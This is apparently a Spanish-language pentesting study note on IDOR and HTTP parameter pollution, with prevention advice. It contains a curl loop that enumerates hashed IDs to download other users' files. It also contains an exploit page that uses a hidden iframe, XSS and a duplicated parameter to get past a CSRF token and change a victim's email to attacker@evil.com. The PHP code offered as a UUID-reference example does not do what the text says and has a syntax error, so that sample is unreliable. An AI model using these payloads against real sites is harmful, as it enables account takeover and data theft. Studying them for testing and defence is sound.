# IDOR (INSECURE DIRECT OBJECT REFERENCE)

## Table of contents

- [IDOR (INSECURE DIRECT OBJECT REFERENCE)](#idor-insecure-direct-object-reference)
  - [EJEMPLOS](#ejemplos)
  - [IMPACTO](#impacto)
  - [IDENTIFICACION](#identificacion)
    - [URL & API](#url--api)
    - [AJAX CALLS](#ajax-calls)
    - [Comprender Hashing/Codificación](#comprender-hashingcodificacin)
    - [Comparar roles de usuario](#comparar-roles-de-usuario)
  - [TOOLS](#tools)
  - [IDOR en API no seguras](#idor-en-api-no-seguras)
    - [DIVULGACION DE INFORMACION](#divulgacion-de-informacion)
    - [DIVULGACION DE INFORMACION + IDOR](#divulgacion-de-informacion--idor)
  - [HTTP PARAMETER POLLUTION (HPP)](#http-parameter-pollution-hpp)
    - [Comportamiento esperado por servidor de aplicaciones](#comportamiento-esperado-por-servidor-de-aplicaciones)
    - [EJEMPLOS](#ejemplos)
    - [SERVER SIDE HPP](#server-side-hpp)
    - [CLIENT SIDE HPP](#client-side-hpp)
  - [BYPASS CSRF TOKEN VIA HPP Y XSS](#bypass-csrf-token-via-hpp-y-xss)
  - [PREVENCION](#prevencion)
    - [Control de acceso a nivel de objeto](#control-de-acceso-a-nivel-de-objeto)
    - [Referencia de objetos](#referencia-de-objetos)
  - [FUENTE](#fuente)

IDOR es un tipo de **BROKEN ACCESS CONTROL**

Las referencias directas a objetos inseguras (IDOR) se producen cuando una aplicación proporciona acceso directo a objetos en función de la entrada proporcionada por el usuario. Como resultado de esta vulnerabilidad, los atacantes pueden eludir la autorización y acceder directamente a los recursos del sistema, por ejemplo, registros o archivos de la base de datos.

Para probar esta vulnerabilidad, el evaluador primero debe mapear todas las ubicaciones en la aplicación donde la entrada del usuario se usa para hacer referencia a objetos directamente. Por ejemplo, ubicaciones donde se utiliza la entrada del usuario para acceder a una fila de base de datos, un archivo, páginas de aplicaciones y más. 

A continuación, el evaluador debe modificar el valor del parámetro utilizado para hacer referencia a los objetos y evaluar si es posible recuperar objetos que pertenecen a otros usuarios o, de lo contrario, eludir la autorización.

## EJEMPLOS

```bash

#recuperar un valor de una DB
http://foo.bar/somepage?invoice=12345

#realizar una operacion del sistema a un usuario especifico
http://foo.bar/changepassword?user=someuser

#recuperar un recurso
http://foo.bar/showImage?img=img00011

#acceder a una funcionalidad de la aplicacion
http://foo.bar/accessPage?menuitem=12
```

[https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf)

## IMPACTO

El ejemplo más básico de una vulnerabilidad IDOR es acceder a archivos y recursos privados de otros usuarios a los que no deberíamos tener acceso, como archivos personales o datos de tarjetas de crédito, lo que se conoce como `IDOR Information Disclosure Vulnerabilities`.

Las vulnerabilidades de IDOR también pueden conducir a la elevación de los privilegios de usuario de un usuario estándar a un usuario administrador, con `IDOR Insecure Function Calls`. Por ejemplo, muchas aplicaciones web exponen parámetros de URL o API para funciones solo de administrador en el código frontal de la aplicación web y deshabilitan estas funciones para usuarios que no son administradores. Sin embargo, si tuviéramos acceso a dichos parámetros o API, podemos llamarlos con nuestros privilegios de usuario estándar.

## IDENTIFICACION

### URL & API

El primer paso para explotar las vulnerabilidades de IDOR es identificar las referencias directas a objetos. Cada vez que recibimos un archivo o recurso específico, debemos estudiar las solicitudes HTTP para buscar parámetros de URL o API con una referencia de objeto (por ejemplo, `?uid=1`o `?filename=file_1.pdf`). Estos se encuentran principalmente en parámetros de URL o API, pero también se pueden encontrar en otros encabezados HTTP, como cookies.

![[Pasted image 20230123153441.png]]

### AJAX CALLS

También es posible que podamos identificar parámetros o API no utilizados en el código de front-end en forma de llamadas JavaScript AJAX. Algunas aplicaciones web desarrolladas en marcos de JavaScript pueden colocar de manera insegura todas las llamadas de función en el front-end y usar las apropiadas según el rol del usuario.

```javascript
function changeUserPassword() {
    $.ajax({
        url:"change_password.php",
        type: "post",
        dataType: "json",
        data: {uid: user.uid, password: user.password, is_admin: is_admin},
        success:function(result){
            //
        }
    });
}
```

Es posible que nunca se llame a la función anterior cuando usamos la aplicación web como un usuario que no es administrador. Sin embargo, si lo ubicamos en el código front-end, podemos probarlo de diferentes maneras para ver si podemos llamarlo para realizar cambios, lo que indicaría que es vulnerable a IDOR.

![[Pasted image 20230123153122.png]]

### Comprender Hashing/Codificación

Algunas aplicaciones web pueden no usar números secuenciales simples como referencias de objetos, sino que pueden codificar la referencia o codificarla en su lugar. Si encontramos dichos parámetros utilizando valores codificados o hash, es posible que aún podamos explotarlos si no hay un sistema de control de acceso en el back-end.

Es posible que encontremos la referencia de objetos codificado en **base64**:

```bash
?filename=ZmlsZV8xMjMucGRm
```

o que usa el hash **MD5**:

```bash
download.php?filename=c81e728d9d4c2f636f067f89cc14862c
```

**EJEMPLO DE BASE64 + MD5**

![[Pasted image 20230123154246.png]]

![[Pasted image 20230123154328.png]]

```bash
echo -n 1 | base64 -w 0 | md5sum # cdd96d3cc73d1dbdaffa03cc6cd7339b
```

automatizar el proceso de encontrar archivos:

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

### Comparar roles de usuario

Si queremos realizar ataques IDOR más avanzados, es posible que debamos registrar varios usuarios y comparar sus solicitudes HTTP y referencias de objetos. Esto puede permitirnos comprender cómo se calculan los parámetros de URL y los identificadores únicos y luego calcularlos para que otros usuarios recopilen sus datos.

Por ejemplo, si tuviéramos acceso a dos usuarios diferentes, uno de los cuales puede ver su salario después de realizar la siguiente llamada a la API:

```json
{
  "attributes" : 
    {
      "type" : "salary",
      "url" : "/services/data/salaries/users/1"
    },
  "Id" : "1",
  "Name" : "User1"

}
```

Es posible que el segundo usuario no tenga todos estos parámetros de API para replicar la llamada y no debería poder realizar la misma llamada que `User1`. Sin embargo, con estos detalles a la mano, podemos intentar repetir la misma llamada a la API mientras estamos conectados `User2`para ver si la aplicación web devuelve algo. Dichos casos pueden funcionar si la aplicación web solo requiere una sesión de inicio de sesión válida para realizar la llamada a la API, pero no tiene control de acceso en el back-end para comparar la sesión de la persona que llama con los datos a los que se llama.

## TOOLS

- AUTORIZE PLUGIN PORTSWIGGER.

## IDOR en API no seguras

Si encontramos endpoints de API que hacen referencia a objetos en la URL:

```bash
/profile/api.php/profile/1
```

Podemos:

- Jugar con el valor que parece vulnerable a IDOR.
- Jugar cambiando el verbo HTTP.

![[Pasted image 20230124115035.png]]

### DIVULGACION DE INFORMACION

**EJEMPLO**

si cambiamos el verbo HTTP de un endpoint de actualizacion de datos PUT a GET podriamos intentar recuperar los datos de un usuario:

![[Pasted image 20230124115627.png]]

### DIVULGACION DE INFORMACION + IDOR

En el ejemplo anterior pudimos enumerar informacion de otros usuarios cambiando el verbo HTTP a GET.

Con ese detalle podemos intentar enumerar cuentas de usuarios con roles diferentes como **administrator** para poder actualizar nuestro usuario con ese rol:

![[Pasted image 20230124144925.png]]

Ya sabemos que rol es el del admin, podemos intentar:

- cambiar el rol a nuestra cuenta:
![[Pasted image 20230124145147.png]]

- cambiar datos de la cuenta admin:
![[Pasted image 20230124145420.png]]

## HTTP PARAMETER POLLUTION (HPP)

el HPP prueba la respuesta de las aplicaciones al recibir múltiples parámetros HTTP con el mismo nombre; por ejemplo, si el parámetro usernamese incluye dos veces en los parámetros GET o POST.

Proporcionar varios parámetros HTTP con el mismo nombre puede hacer que una aplicación interprete los valores de forma imprevista. Al explotar estos efectos, un atacante puede eludir la validación de entrada, desencadenar errores de aplicación o modificar valores de variables internas. Dado que HPP afecta a un bloque de construcción de todas las tecnologías web, existen ataques del lado del servidor y del cliente.

### Comportamiento esperado por servidor de aplicaciones

La siguiente tabla ilustra cómo se comportan las diferentes tecnologías web en presencia de múltiples ocurrencias del mismo parámetro HTTP.

Dada la URL y la cadena de consulta: http://example.com/?color=red&color=blue


|Web Application Server Backend	|Parsing Result	|Example|
|:----:|:-----:|:-----:|
|ASP.NET / IIS	|All occurrences concatenated with a comma	|color=red,blue|
|ASP / IIS	|All occurrences concatenated with a comma|	color=red,blue|
|.NET Core 3.1 / Kestrel	|All occurrences concatenated with a comma	|color=red,blue|
|.NET 5 / Kestrel|	All occurrences concatenated with a comma	|color=red,blue|
|PHP / Apache	|Last occurrence only	|color=blue|
|PHP / Zeus	|Last occurrence only	|color=blue|
|JSP, Servlet / Apache Tomcat|	First occurrence only	|color=red|
|JSP, Servlet / Oracle Application Server 10g|	First occurrence only	|color=red|
JSP, Servlet / Jetty	|First occurrence only	|color=red
|IBM Lotus Domino	|Last occurrence only|	color=blue|
IBM HTTP Server	|First occurrence only	|color=red
|node.js / express	|First occurence only	|color=red|
|mod_perl, libapreq2 / Apache	|First occurrence only|	color=red|
|Perl CGI / Apache	|First occurrence only	|color=red|
|mod_wsgi (Python) / Apache	|First occurrence only|	color=red|
|Python / Zope	|All occurrences in List data type	|color=[‘red’,’blue’]|

### EJEMPLOS

```bash
# Bypass restrictions using parameter pollution
# You can use the same parameter several times
api.example/profile?UserId=123 # Ok, your profile
api.example/profile?UserId=456 # ERROR
api.example/profile?UserId=456&UserId=123 # OK, it can work
```

```bash
# Tips
# - Some encoded/hashed IDs can be predictable --> Create accounts to see
# - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex)
# - Switch between POST and PUT to bypass potential controls
```

### SERVER SIDE HPP

- Para probar las vulnerabilidades de HPP, identifique cualquier forma o acción que permita la entrada proporcionada por el usuario. 
- Los parámetros de la cadena de consulta en las solicitudes HTTP GET son fáciles de modificar en la barra de navegación del navegador. 
- Si la acción del formulario envía datos a través de POST, el evaluador deberá usar un proxy de interceptación para manipular los datos POST a medida que se envían al servidor.

Habiendo identificado un parámetro de entrada particular para probar, uno puede editar los datos GET o POST interceptando la solicitud, o cambiar la cadena de consulta después de que se carga la página de respuesta. Para probar las vulnerabilidades de HPP, simplemente agregue el mismo parámetro a los datos GET o POST pero con un valor diferente asignado.

```bash
http://example.com/?search_string=kittens #peticion original
  |
  ---> http://example.com/?mode=guest&search_string=kittens&num_results=100 #puede tener otros parametros
  		|
  		---> http://example.com/?mode=guest&search_string=kittens&num_results=100&search_string=puppies #duplicamos el primer parametro con otro valor para probar
```

Analice la página de respuesta para determinar qué valores se analizaron. En el ejemplo anterior, los resultados de búsqueda pueden mostrar kittens, puppies, alguna combinación de ambos (kittens,puppies o kittens\~puppies o \['kittens','puppies'\]), puede dar un resultado vacío o una página de error.

Como regla general: 

- Si el servidor asigna solo los primeros o últimos parámetros contaminados, entonces la contaminación de parámetros no revela una vulnerabilidad. 
- Si los parámetros duplicados se concatenan, los diferentes componentes de la aplicación web usan diferentes ocurrencias o la prueba genera un error, existe una mayor probabilidad de poder usar la contaminación de parámetros para desencadenar vulnerabilidades de seguridad.

Un análisis más profundo requeriría tres solicitudes HTTP para cada parámetro HTTP:

1. Envíe una solicitud HTTP que contenga el nombre y el valor del parámetro estándar y registre la respuesta HTTP. 

```bash
page?par1=val1
```

2. Reemplace el valor del parámetro con un valor manipulado, envíe y registre la respuesta HTTP. 

```bash
page?par1=HPP_TEST1
```

3. Envía una nueva solicitud combinando los pasos (1) y (2). Nuevamente, guarde la respuesta HTTP. 

```bash
page?par1=val1&par1=HPP_TEST1
```

4. Compare las respuestas obtenidas durante todos los pasos anteriores. Si la respuesta de (3) es diferente de (1) y la respuesta de (3) también es diferente de (2), hay un desajuste de impedancia que eventualmente se puede abusar para desencadenar vulnerabilidades de HPP.

### CLIENT SIDE HPP

Para probar las vulnerabilidades del lado del cliente de HPP, identifique cualquier forma o acción que permita la entrada del usuario y muestre el resultado de esa entrada al usuario. Una página de búsqueda es ideal, pero es posible que un cuadro de inicio de sesión no funcione (ya que es posible que no muestre un nombre de usuario no válido al usuario).

ejemplo:

se tiene la siguiente **Url: http://host/election.jsp?poll_id=4568** que carga una pagina de votacion, esta URL es colocada en un link para realizar la votacion en elecciones, para decir quien voto por que persona:

```html
<a href="vote.jsp?poll_id=4568&candidate=white">Vote for Mr. White</a> #link1

<a href="vote.jsp?poll_id=4568&candidate=green">Vote for Mrs. Green</a> #link2
```

que pasaria si se modifica la URL?

**Url: http://host/election.jsp?poll_id=4568%26candidate%3Dgreen**

(%26 -> &) y (%3d -> =) en url encoded

los link quedarian asi:

```html
<a href=vote.jsp?poll_id=4568&candidate=green&candidate=white>Vote for Mr. White</a> #link1

<a href=vote.jsp?poll_id=4568&candidate=green&candidate=green>Vote for Mrs. Green</a> #link2
```

si la tecnologia web solo tomara el primer valor cuando encuentra uno repetido, **ambos links votarian por green**.

En particular, preste atención a las respuestas que tienen vectores HPP dentro de los atributos  **data**, **src**, **href** o formas de acciones.

## BYPASS CSRF TOKEN VIA HPP Y XSS

- [https://plainsec.org/defeating-csrf-token-using-xss-and-hpp/](https://plainsec.org/defeating-csrf-token-using-xss-and-hpp/)

```html
<!-- change_email.php -->
<form method="post">
Current Email: <input type="text" name="cur_email" value="<?php echo $current_email; ?>"/> <br/>
New Email: <input type="text" name="new_email"/> <br/>
<input type="hidden" name="token" value="<?php echo $csrf_token; ?>"/>
<input type="submit" value="Change Email"/>
</form>
```

Este formulario no suele ser vulnerable a los ataques CSRF debido al impredecible $csrf_token,  pero si logramos encontrar una vulnerabilidad XSS en el mismo dominio, podemos eludir esta protección. Este es el plan:

1. Cree un iframe oculto que apunte a http://target.com/change_email.php

2. Cree un nuevo parámetro oculto (con JavaScript) y añádalo al formulario para que, utilizando el principio de HPP  , podamos engañar al servidor web y enviar el correo electrónico del atacante.

3. Enviar el iframe oculto

Vamos a crear nuestra página de explotación ficticia:

```html
<!-- exploit.html -->
<html>
<head>
<script type="text/javascript">
function submit_iframeform()
{
    var newParam = document.createElement("input");
    var myForm = iframe_form.document.forms[0]; //might be some other form on the same page
 
    newParam.type = "hidden";
    newParam.name = "new_email";
    newParam.value = "attacker@evil.com";
 
    myForm.appendChild(newParam);
    myForm.submit();
}
</script>
</head>
<body onload="submit_iframeform();">
<iframe name="iframe_form" src="https://target.com/change_email.php">< /iframe>
</body>
</html>
```

¿Se pregunta cómo se ven los datos POST de la solicitud HTTP después de enviar el formulario desde  exploit.html?

```bash
cur_email=current%40provider.com&new_email=&token={RANDOM_TOKEN}&new_email=atacante%40evil.com
```

Aquí estamos utilizando  el principio de HPP, de hecho, estamos agregando un parámetro (new_email) que ya está presente en el contenido POST. Ahora estarás pensando, ¿cómo reacciona el servidor web si le enviamos dos parámetros con el mismo nombre? **Si el servidor web de destino es Apache, se tiene en cuenta la última aparición de  new_email. ¡Ataque exitoso!**

¿Estás pensando “¿Por qué necesitamos XSS para que este ataque funcione? ” eso se debe a la  política del mismo origen (SOP). No podemos acceder a la propiedad 'document' de iframe_form si no estamos ejecutando  exploit.html  desde el mismo dominio donde  está change_email.php  .

## PREVENCION

### Control de acceso a nivel de objeto

Los roles y permisos de usuario son una parte vital de cualquier sistema de control de acceso, que se realiza completamente en un sistema de control de acceso basado en roles (RBAC). Para evitar explotar las vulnerabilidades de IDOR, debemos asignar el RBAC a todos los objetos y recursos. El servidor back-end puede permitir o denegar todas las solicitudes, dependiendo de si el rol del solicitante tiene suficientes privilegios para acceder al objeto o al recurso.

Una vez que se haya implementado un RBAC, a cada usuario se le asignaría un rol que tiene ciertos privilegios. Con cada solicitud que haga el usuario, se probarán sus roles y privilegios para ver si tiene acceso al objeto que está solicitando. Solo se les permitiría acceder a él si tienen derecho a hacerlo.

Hay muchas maneras de implementar un sistema RBAC y asignarlo a los objetos y recursos de la aplicación web, y diseñarlo en el núcleo de la estructura de la aplicación web es un arte para perfeccionar. El siguiente es un código de muestra de cómo una aplicación web puede comparar roles de usuario con objetos para permitir o denegar el control de acceso:

```javascript
match /api/profile/{userId} {
    allow read, write: if user.isAuth == true
    && (user.uid == userId || user.roles == 'admin');
}
```

El ejemplo anterior usa el `user`token, que puede ser `mapeada de la peticion que tiene un token (JWT) de RBAC`para recuperar los diversos roles y privilegios del usuario. Luego, solo permite el acceso de lectura/escritura si el usuario `uid`en el sistema RBAC coincide `uid`con el punto final de la API que está solicitando. Además, si un usuario tiene `admin`como rol en el RBAC de back-end, se le permite acceso de lectura/escritura.

### Referencia de objetos

Incluso después de construir un sistema de control de acceso sólido, nunca debemos usar referencias a objetos en texto claro o patrones simples (por ejemplo, `uid=1`). Siempre debemos usar referencias fuertes y únicas, como hashes salados o `UUID`'s. Por ejemplo, podemos usar `UUID V4` para generar una identificación fuertemente aleatoria para cualquier elemento, que se parece a ( `89c9b29b-d19f-4515-b2dd-abb6e693eb20`). Luego, podemos asignar esto `UUID`al objeto al que hace referencia en la base de datos de back-end, y cada vez que `UUID` se llame, la base de datos de back-end sabrá qué objeto devolver. El siguiente ejemplo de código PHP nos muestra cómo puede funcionar esto:

```php
$uid = intval($_REQUEST['uid']);
$query = "SELECT url FROM documents where uid=" . $uid;
$result = mysqli_query($conn, $query);
$row = mysqli_fetch_array($result));
echo "<a href='" . $row['url'] . "' target='_blank'></a>";
```

Finalmente, debemos tener en cuenta que el uso de `UUID`s puede permitir que las vulnerabilidades de IDOR pasen desapercibidas, ya que hace que sea más difícil probar las vulnerabilidades de IDOR. Esta es la razón por la cual la referencia sólida a objetos siempre es el segundo paso después de implementar un sistema de control de acceso sólido.

## FUENTE

- [https://www.s3.eurecom.fr/docs/ndss11_hpp.pdf](https://www.s3.eurecom.fr/docs/ndss11_hpp.pdf)
- [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)